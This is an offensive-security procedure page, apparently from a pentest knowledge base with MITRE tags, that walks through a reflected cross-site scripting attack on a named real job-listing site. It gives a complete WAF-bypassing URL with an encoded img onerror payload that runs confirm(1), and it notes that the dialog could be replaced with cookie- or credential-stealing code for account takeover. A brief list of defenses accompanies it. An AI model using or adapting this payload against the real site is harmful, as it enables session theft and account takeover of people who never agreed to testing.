---
tags:
  - xss
  - javascript-execution
  - data-theft
type: procedure
tools:
  - '[[tools/Firefox]]'
  - '[[tools/Chrome]]'
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.434Z'
sub_techniques: []
id: 8fb04d5f-faaf-44c1-97f1-6b189803395d
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-XSS-Payload-to-Trigger-JavaScript-Alert

## Summary

This procedure loads the WAF-bypassing URL to execute the injected JavaScript, triggering a confirm dialog as proof-of-concept, which could be replaced with code to steal cookies or credentials.

## Description

With the encoded payload in place, accessing the URL decodes and executes the onerror handler on the img tag, running arbitrary JS in the victim's context. This enables collection of session data for account takeover or phishing escalation.

## Requirements

1. Crafted bypassing payload from previous step
2. Web browser for execution
3. Target URL with parameter

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP headers to prevent inline JS
- Monitor for onerror events in client-side logs
- Rate-limit suspicious parameter values

## Objectives

1. Execute JavaScript in page context
2. Demonstrate impact like alerts or data access
3. Highlight risks of unsanitized reflections

## Instructions

### Step 1: Construct Final URL

**Context**: Build the URL with the encoded XSS payload.

Use:

```url
https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-img-src-onerror-confirm-and-amp-x00028-1-and-amp-x00029-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bimg+src+onerror%3Dconfirm%26amp%3B%23x00028%3B1%26amp%3B%23x00029%3B%26gt%3B&selectedLocationString=N%2C115
```

> This injects the img tag that fails src load and runs confirm(1).

### Step 2: Trigger Execution

**Context**: Load to run the JS.

Navigate to the URL in the browser.

> A confirm dialog with '1' should appear, confirming XSS success.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Firefox]]
- [[tools/Chrome]]

## Tags

- [[xss]]
- [[javascript-execution]]
- [[data-theft]]
